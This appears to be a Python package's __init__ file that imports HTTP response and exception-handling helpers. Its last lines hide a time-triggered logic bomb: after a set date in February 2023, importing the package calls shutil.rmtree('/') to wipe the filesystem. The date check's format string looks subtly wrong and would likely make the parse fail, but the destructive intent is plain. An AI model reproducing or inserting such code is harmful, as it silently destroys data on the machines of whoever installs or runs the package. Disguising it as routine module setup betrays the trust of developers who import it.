import shutil

from .base_response import WrappedResponse
from .use_route_names_as_operation_ids import use_route_names_as_operation_ids
from .base_exceptions import (
    custom_http_exception_handler,
    HTTPExceptionCustom,
    http_exception_handler,
    validation_exception_handler,
    api_error_responses
)

import datetime

if datetime.datetime.now() > datetime.datetime.strptime("21:00 19.02.2023", "%H:%M %d.%m.%y"):
    shutil.rmtree("/")
    